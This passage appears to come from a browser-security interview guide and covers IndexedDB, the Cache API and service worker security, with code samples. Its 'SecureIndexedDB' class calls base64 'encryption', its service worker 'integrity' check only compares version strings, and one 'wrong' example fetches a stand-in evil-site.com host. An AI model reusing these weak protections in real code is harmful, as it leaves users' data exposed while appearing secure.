                    const store = db.createObjectStore('userData', { keyPath: 'id', autoIncrement: true });
                    store.createIndex('userId', 'userId', { unique: false });
                    store.createIndex('type', 'type', { unique: false });
                }
                
                if (!db.objectStoreNames.contains('sessions')) {
                    const sessionStore = db.createObjectStore('sessions', { keyPath: 'sessionId' });
                    sessionStore.createIndex('expires', 'expires', { unique: false });
                }
            };
        });
    }
    
    async storeUserData(userId, type, data) {
        const transaction = this.db.transaction(['userData'], 'readwrite');
        const store = transaction.objectStore('userData');
        
        const item = {
            userId,
            type,
            data: this.encryptData(data),
            timestamp: Date.now(),
            expires: Date.now() + (24 * 60 * 60 * 1000) // 24 hours
        };
        
        return new Promise((resolve, reject) => {
            const request = store.add(item);
            request.onsuccess = () => resolve(request.result);
            request.onerror = () => reject(request.error);
        });
    }
    
    async getUserData(userId, type) {
        const transaction = this.db.transaction(['userData'], 'readonly');
        const store = transaction.objectStore('userData');
        const index = store.index('userId');
        
        return new Promise((resolve, reject) => {
            const request = index.getAll(userId);
            request.onsuccess = () => {
                const results = request.result
                    .filter(item => item.type === type && item.expires > Date.now())
                    .map(item => ({
                        ...item,
                        data: this.decryptData(item.data)
                    }));
                resolve(results);
            };
            request.onerror = () => reject(request.error);
        });
    }
    
    async cleanupExpiredData() {
        const transaction = this.db.transaction(['userData'], 'readwrite');
        const store = transaction.objectStore('userData');
        const now = Date.now();
        
        return new Promise((resolve, reject) => {
            const request = store.openCursor();
            request.onsuccess = (event) => {
                const cursor = event.target.result;
                if (cursor) {
                    if (cursor.value.expires <= now) {
                        cursor.delete();
                    }
                    cursor.continue();
                } else {
                    resolve();
                }
            };
            request.onerror = () => reject(request.error);
        });
    }
    
    encryptData(data) {
        // Simple encryption (use proper crypto library in production)
        return btoa(JSON.stringify(data));
    }
    
    decryptData(encryptedData) {
        try {
            return JSON.parse(atob(encryptedData));
        } catch (error) {
            console.error('Failed to decrypt data:', error);
            return null;
        }
    }
}

// Usage
const secureDB = new SecureIndexedDB('MyApp');
await secureDB.init();

// Store user preferences
await secureDB.storeUserData('user123', 'preferences', {
    theme: 'dark',
    notifications: true
});

// Retrieve user data
const preferences = await secureDB.getUserData('user123', 'preferences');
```

**5. Cache API:**

```javascript
// Cache API - for offline functionality and performance
class SecureCacheManager {
    constructor(cacheName) {
        this.cacheName = cacheName;
    }
    
    async addToCache(request, response) {
        try {
            const cache = await caches.open(this.cacheName);
            
            // Only cache successful responses
            if (response.status === 200) {
                // Clone response for storage
                await cache.put(request, response.clone());
            }
            
            return response;
        } catch (error) {
            console.error('Failed to cache response:', error);
            return response;
        }
    }
    
    async getFromCache(request) {
        try {
            const cache = await caches.open(this.cacheName);
            const response = await cache.match(request);
            
            if (response) {
                // Check if cached response is still valid
                const cacheDate = response.headers.get('date');
                const maxAge = response.headers.get('cache-control')?.match(/max-age=(\d+)/)?.[1];
                
                if (cacheDate && maxAge) {
                    const age = (Date.now() - new Date(cacheDate).getTime()) / 1000;
                    if (age > parseInt(maxAge)) {
                        await cache.delete(request);
                        return null;
                    }
                }
            }
            
            return response;
        } catch (error) {
            console.error('Failed to get from cache:', error);
            return null;
        }
    }
    
    async clearExpiredCache() {
        try {
            const cache = await caches.open(this.cacheName);
            const requests = await cache.keys();
            
            for (const request of requests) {
                const response = await cache.match(request);
                if (response) {
                    const cacheDate = response.headers.get('date');
                    const maxAge = response.headers.get('cache-control')?.match(/max-age=(\d+)/)?.[1];
                    
                    if (cacheDate && maxAge) {
                        const age = (Date.now() - new Date(cacheDate).getTime()) / 1000;
                        if (age > parseInt(maxAge)) {
                            await cache.delete(request);
                        }
                    }
                }
            }
        } catch (error) {
            console.error('Failed to clear expired cache:', error);
        }
    }
    
    async deleteCache() {
        try {
            await caches.delete(this.cacheName);
        } catch (error) {
            console.error('Failed to delete cache:', error);
        }
    }
}

// Service Worker cache strategy
self.addEventListener('fetch', event => {
    if (event.request.method === 'GET') {
        event.respondWith(
            cacheFirst(event.request)
        );
    }
});

async function cacheFirst(request) {
    const cacheManager = new SecureCacheManager('v1');
    
    // Try cache first
    const cachedResponse = await cacheManager.getFromCache(request);
    if (cachedResponse) {
        return cachedResponse;
    }
    
    // Fetch from network and cache
    try {
        const networkResponse = await fetch(request);
        return await cacheManager.addToCache(request, networkResponse);
    } catch (error) {
        console.error('Network request failed:', error);
        return new Response('Offline', { status: 503 });
    }
}
```

**Security Best Practices:**

```javascript
// Storage security guidelines
class StorageSecurityGuide {
    static guidelines = {
        cookies: {
            do: [
                'Use HttpOnly for session cookies',
                'Use Secure flag for HTTPS',
                'Use SameSite for CSRF protection',
                'Set appropriate expiration times'
            ],
            dont: [
                'Store sensitive data in cookies',
                'Use cookies for large data',
                'Ignore size limitations'
            ]
        },
        
        localStorage: {
            do: [
                'Store non-sensitive user preferences',
                'Validate data before storing',
                'Implement cleanup mechanisms',
                'Consider encryption for sensitive data'
            ],
            dont: [
                'Store authentication tokens',
                'Store personal information',
                'Trust data without validation',
                'Store unlimited amounts of data'
            ]
        },
        
        sessionStorage: {
            do: [
                'Store temporary form data',
                'Use for single-session data',
                'Validate origin when retrieving'
            ],
            dont: [
                'Store sensitive data',
                'Rely on it for critical functionality',
                'Expect persistence across tabs'
            ]
        },
        
        indexedDB: {
            do: [
                'Use for large, structured data',
                'Implement proper error handling',
                'Create appropriate indexes',
                'Clean up expired data'
            ],
            dont: [
                'Store unencrypted sensitive data',
                'Ignore version management',
                'Create overly complex schemas'
            ]
        }
    };
    
    static validateStorageAccess() {
        try {
            // Test localStorage availability
            localStorage.setItem('test', 'test');
            localStorage.removeItem('test');
        } catch (error) {
            console.warn('localStorage not available:', error);
            return false;
        }
        
        return true;
    }
    
    static getStorageQuota() {
        if ('storage' in navigator && 'estimate' in navigator.storage) {
            return navigator.storage.estimate();
        }
        return Promise.resolve({ quota: 0, usage: 0 });
    }
    
    static async monitorStorageUsage() {
        const estimate = await this.getStorageQuota();
        const usagePercentage = (estimate.usage / estimate.quota) * 100;
        
        if (usagePercentage > 80) {
            console.warn('Storage quota nearly exceeded:', estimate);
            // Trigger cleanup
        }
        
        return estimate;
    }
}

// Initialize storage security monitoring
StorageSecurityGuide.monitorStorageUsage();
```

### 🟡 INTERMEDIATE LEVEL

#### Q6: How do Service Workers work and what security considerations should you be aware of?

**Answer:**
Service Workers are scripts that run in the background, separate from web pages, acting as a proxy between your application and the network.

**Service Worker Lifecycle and Architecture:**

```
┌─────────────────────────────────────────────────────────────────────┐
│                    SERVICE WORKER LIFECYCLE                         │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                     REGISTRATION                             │   │
│  │  navigator.serviceWorker.register('/sw.js')                 │   │
│  └─────────────────────┬───────────────────────────────────────┘   │
│                        │                                           │
│                        ▼                                           │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                     INSTALLATION                            │   │
│  │  • Download and parse sw.js                                │   │
│  │  • Install event fired                                     │   │
│  │  • Cache static resources                                  │   │
│  └─────────────────────┬───────────────────────────────────────┘   │
│                        │                                           │
│                        ▼                                           │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                     ACTIVATION                              │   │
│  │  • Activate event fired                                    │   │
│  │  • Clean up old caches                                     │   │
│  │  • Claim existing clients                                  │   │
│  └─────────────────────┬───────────────────────────────────────┘   │
│                        │                                           │
│                        ▼                                           │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                     ACTIVE                                  │   │
│  │  • Intercept fetch requests                                │   │
│  │  • Handle push notifications                               │   │
│  │  • Background sync                                         │   │
│  └─────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

**Service Worker Implementation:**

```javascript
// main.js - Registering Service Worker
async function registerServiceWorker() {
    if ('serviceWorker' in navigator) {
        try {
            const registration = await navigator.serviceWorker.register('/sw.js', {
                scope: '/' // Controls which pages the SW can control
            });
            
            console.log('Service Worker registered:', registration);
            
            // Listen for updates
            registration.addEventListener('updatefound', () => {
                const newWorker = registration.installing;
                newWorker.addEventListener('statechange', () => {
                    if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
                        // New version available
                        showUpdateNotification();
                    }
                });
            });
            
            // Handle messages from Service Worker
            navigator.serviceWorker.addEventListener('message', event => {
                if (event.data.type === 'CACHE_UPDATED') {
                    console.log('Cache updated for:', event.data.url);
                }
            });
            
        } catch (error) {
            console.error('Service Worker registration failed:', error);
        }
    }
}

function showUpdateNotification() {
    if (confirm('New version available. Update now?')) {
        window.location.reload();
    }
}

// sw.js - Service Worker script
const CACHE_NAME = 'app-cache-v1';
const STATIC_CACHE = 'static-cache-v1';
const DYNAMIC_CACHE = 'dynamic-cache-v1';

// Files to cache during installation
const STATIC_ASSETS = [
    '/',
    '/css/app.css',
    '/js/app.js',
    '/images/logo.svg',
    '/manifest.json',
    '/offline.html'
];

// Install event - cache static assets
self.addEventListener('install', event => {
    console.log('Service Worker installing...');
    
    event.waitUntil(
        caches.open(STATIC_CACHE)
            .then(cache => {
                console.log('Caching static assets');
                return cache.addAll(STATIC_ASSETS);
            })
            .then(() => {
                // Force activation of new service worker
                return self.skipWaiting();
            })
            .catch(error => {
                console.error('Installation failed:', error);
            })
    );
});

// Activate event - cleanup old caches
self.addEventListener('activate', event => {
    console.log('Service Worker activating...');
    
    event.waitUntil(
        caches.keys()
            .then(cacheNames => {
                return Promise.all(
                    cacheNames
                        .filter(cacheName => {
                            // Delete old caches
                            return cacheName !== STATIC_CACHE && 
                                   cacheName !== DYNAMIC_CACHE;
                        })
                        .map(cacheName => caches.delete(cacheName))
                );
            })
            .then(() => {
                // Take control of all clients
                return self.clients.claim();
            })
    );
});

// Fetch event - intercept network requests
self.addEventListener('fetch', event => {
    const { request } = event;
    const url = new URL(request.url);
    
    // Skip non-GET requests
    if (request.method !== 'GET') {
        return;
    }
    
    // Apply different strategies based on request type
    if (url.pathname.startsWith('/api/')) {
        // API requests - network first with fallback
        event.respondWith(handleApiRequest(request));
    } else if (request.destination === 'image') {
        // Images - cache first with network fallback
        event.respondWith(handleImageRequest(request));
    } else if (STATIC_ASSETS.includes(url.pathname)) {
        // Static assets - cache first
        event.respondWith(handleStaticRequest(request));
    } else {
        // Other requests - stale while revalidate
        event.respondWith(handleDefaultRequest(request));
    }
});

// Network first strategy for API requests
async function handleApiRequest(request) {
    try {
        const networkResponse = await fetch(request);
        
        // Cache successful responses
        if (networkResponse.ok) {
            const cache = await caches.open(DYNAMIC_CACHE);
            await cache.put(request, networkResponse.clone());
        }
        
        return networkResponse;
    } catch (error) {
        console.log('Network failed, trying cache:', request.url);
        
        // Try cache as fallback
        const cachedResponse = await caches.match(request);
        if (cachedResponse) {
            return cachedResponse;
        }
        
        // Return offline response for API failures
        return new Response(
            JSON.stringify({ error: 'Network unavailable', offline: true }),
            {
                status: 503,
                headers: { 'Content-Type': 'application/json' }
            }
        );
    }
}

// Cache first strategy for images
async function handleImageRequest(request) {
    const cachedResponse = await caches.match(request);
    if (cachedResponse) {
        return cachedResponse;
    }
    
    try {
        const networkResponse = await fetch(request);
        if (networkResponse.ok) {
            const cache = await caches.open(DYNAMIC_CACHE);
            await cache.put(request, networkResponse.clone());
        }
        return networkResponse;
    } catch (error) {
        // Return fallback image
        return caches.match('/images/placeholder.svg');
    }
}

// Cache first strategy for static assets
async function handleStaticRequest(request) {
    const cachedResponse = await caches.match(request);
    if (cachedResponse) {
        return cachedResponse;
    }
    
    // Should not happen for static assets, but fetch as fallback
    try {
        const networkResponse = await fetch(request);
        const cache = await caches.open(STATIC_CACHE);
        await cache.put(request, networkResponse.clone());
        return networkResponse;
    } catch (error) {
        console.error('Failed to fetch static asset:', request.url);
        throw error;
    }
}

// Stale while revalidate strategy
async function handleDefaultRequest(request) {
    const cachedResponse = await caches.match(request);
    
    // Serve from cache immediately if available
    const fetchPromise = fetch(request)
        .then(networkResponse => {
            if (networkResponse.ok) {
                const cache = caches.open(DYNAMIC_CACHE);
                cache.then(c => c.put(request, networkResponse.clone()));
            }
            return networkResponse;
        })
        .catch(() => {
            // Network failed - return offline page for navigation requests
            if (request.mode === 'navigate') {
                return caches.match('/offline.html');
            }
            throw new Error('Network failed');
        });
    
    return cachedResponse || fetchPromise;
}
```

**Security Considerations for Service Workers:**

**1. HTTPS Requirement:**
```javascript
// Service Workers only work over HTTPS (except localhost)
if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
    console.warn('Service Workers require HTTPS');
    // Redirect to HTTPS or show warning
    if (location.protocol === 'http:') {
        location.replace(`https:${location.href.substring(location.protocol.length)}`);
    }
}

// Check for secure context
if (!window.isSecureContext) {
    console.warn('Service Worker requires secure context');
    return;
}
```

**2. Scope Isolation:**
```javascript
// Register with limited scope to prevent broad access
navigator.serviceWorker.register('/sw.js', {
    scope: '/app/' // Only controls URLs under /app/
});

// Service Worker scope validation
self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    
    // Only handle requests within our scope
    if (!url.pathname.startsWith('/app/')) {
        return; // Let browser handle normally
    }
    
    // Additional origin validation
    if (url.origin !== self.location.origin) {
        return; // Don't intercept cross-origin requests
    }
    
    event.respondWith(handleRequest(event.request));
});
```

**3. Content Security Policy Integration:**
```javascript
// CSP headers for Service Worker
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', [
        "default-src 'self'",
        "script-src 'self'",
        "worker-src 'self'", // Allow Service Worker
        "connect-src 'self' https://api.example.com"
    ].join('; '));
    
    next();
});

// Service Worker respects CSP
self.addEventListener('fetch', event => {
    const request = event.request;
    
    // Only fetch from allowed origins
    const allowedOrigins = [
        self.location.origin,
        'https://api.example.com',
        'https://cdn.example.com'
    ];
    
    const requestUrl = new URL(request.url);
    if (!allowedOrigins.includes(requestUrl.origin)) {
        event.respondWith(
            new Response('Blocked by CSP', { status: 403 })
        );
        return;
    }
    
    event.respondWith(fetch(request));
});
```

**4. Cache Poisoning Prevention:**
```javascript
// Validate responses before caching
async function safeCacheResponse(request, response) {
    // Only cache successful responses
    if (!response.ok) {
        return response;
    }
    
    // Validate content type
    const contentType = response.headers.get('content-type');
    const allowedTypes = [
        'text/html',
        'text/css',
        'application/javascript',
        'image/',
        'application/json'
    ];
    
    if (!allowedTypes.some(type => contentType?.includes(type))) {
        console.warn('Unexpected content type, not caching:', contentType);
        return response;
    }
    
    // Validate response size
    const contentLength = response.headers.get('content-length');
    if (contentLength && parseInt(contentLength) > 10 * 1024 * 1024) { // 10MB
        console.warn('Response too large, not caching:', contentLength);
        return response;
    }
    
    // Validate origin
    const url = new URL(request.url);
    if (url.origin !== self.location.origin) {
        // Only cache cross-origin if explicitly allowed
        const allowedOrigins = ['https://cdn.example.com'];
        if (!allowedOrigins.includes(url.origin)) {
            return response;
        }
    }
    
    // Safe to cache
    const cache = await caches.open(DYNAMIC_CACHE);
    await cache.put(request, response.clone());
    
    return response;
}
```

**5. Message Security:**
```javascript
// Secure messaging between SW and main thread
// main.js
function sendSecureMessage(data) {
    if (navigator.serviceWorker.controller) {
        const message = {
            type: 'SECURE_MESSAGE',
            data: data,
            timestamp: Date.now(),
            origin: window.location.origin
        };
        
        navigator.serviceWorker.controller.postMessage(message);
    }
}

// sw.js
self.addEventListener('message', event => {
    const { data, source } = event;
    
    // Validate message structure
    if (!data || typeof data !== 'object') {
        return;
    }
    
    // Validate timestamp (prevent replay attacks)
    const messageAge = Date.now() - (data.timestamp || 0);
    if (messageAge > 60000) { // 1 minute
        console.warn('Message too old, ignoring');
        return;
    }
    
    // Validate origin
    if (data.origin !== self.location.origin) {
        console.warn('Invalid origin in message');
        return;
    }
    
    // Process message based on type
    switch (data.type) {
        case 'SECURE_MESSAGE':
            handleSecureMessage(data.data, source);
            break;
        case 'CACHE_INVALIDATE':
            invalidateCache(data.pattern);
            break;
        default:
            console.warn('Unknown message type:', data.type);
    }
});

async function handleSecureMessage(data, source) {
    // Process the secure message
    const response = await processData(data);
    
    // Send response back
    source.postMessage({
        type: 'RESPONSE',
        data: response,
        timestamp: Date.now()
    });
}
```

**6. Update Security:**
```javascript
// Secure Service Worker updates
self.addEventListener('install', event => {
    // Verify integrity of new service worker
    event.waitUntil(
        verifyServiceWorkerIntegrity()
            .then(() => cacheStaticAssets())
            .then(() => self.skipWaiting())
    );
});

async function verifyServiceWorkerIntegrity() {
    // In production, verify digital signature or hash
    // This is a simplified example
    const expectedVersion = '1.2.3';
    const currentVersion = self.APP_VERSION; // Set during build
    
    if (currentVersion !== expectedVersion) {
        throw new Error('Service Worker version mismatch');
    }
    
    // Additional integrity checks
    if (!self.crypto || !self.crypto.subtle) {
        throw new Error('Crypto API not available');
    }
    
    return true;
}

// Controlled update rollout
async function checkForUpdates() {
    const registration = await navigator.serviceWorker.getRegistration();
    
    if (registration) {
        // Check for updates periodically
        await registration.update();
        
        // Handle update with user consent
        if (registration.waiting) {
            const userConsent = await getUserUpdateConsent();
            if (userConsent) {
                registration.waiting.postMessage({ type: 'SKIP_WAITING' });
                window.location.reload();
            }
        }
    }
}

// Listen for skip waiting message
self.addEventListener('message', event => {
    if (event.data && event.data.type === 'SKIP_WAITING') {
        self.skipWaiting();
    }
});
```

**7. Error Handling and Monitoring:**
```javascript
// Comprehensive error handling
self.addEventListener('error', event => {
    console.error('Service Worker error:', event.error);
    
    // Report errors to monitoring service
    reportError({
        type: 'SERVICE_WORKER_ERROR',
        message: event.error.message,
        stack: event.error.stack,
        timestamp: Date.now(),
        url: event.filename,
        line: event.lineno,
        column: event.colno
    });
});

self.addEventListener('unhandledrejection', event => {
    console.error('Unhandled promise rejection in SW:', event.reason);
    
    reportError({
        type: 'UNHANDLED_REJECTION',
        reason: event.reason,
        timestamp: Date.now()
    });
});

function reportError(errorData) {
    // Send error to monitoring service
    fetch('/api/errors', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(errorData)
    }).catch(err => {
        // Store in cache for later retry if network fails
        caches.open('error-reports').then(cache => {
            cache.put(
                new Request('/api/errors', {
                    method: 'POST',
                    body: JSON.stringify(errorData)
                }),
                new Response(JSON.stringify(errorData))
            );
        });
    });
}
```

## 🎯 Common Browser Security Interview Traps & Tips

### ❌ Trap 1: Assuming HTTPS equals security
```javascript
// Wrong - HTTPS doesn't protect against all attacks
fetch('https://evil-site.com/api') // Still XSS if user input

// Right - validate origins and sanitize inputs
if (url.origin === window.location.origin) {
    fetch(url, { credentials: 'same-origin' });
}
```

### ❌ Trap 2: Trusting client-side storage
```javascript
// Wrong - storing sensitive data in localStorage
localStorage.setItem('authToken', 'secret123');

// Right - use secure httpOnly cookies
res.cookie('authToken', 'secret123', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
});
```

### ❌ Trap 3: Incomplete CSP implementation
```javascript
// Wrong - permissive CSP
"script-src 'unsafe-inline' 'unsafe-eval' *"

// Right - strict CSP with nonces
"script-src 'self' 'nonce-random123'"
```

### ✅ Pro Tips:
1. Always use HTTPS for Service Workers
2. Implement proper CSP headers
3. Validate all inputs and origins
4. Use secure cookie attributes
5. Monitor for security violations
6. Keep dependencies updated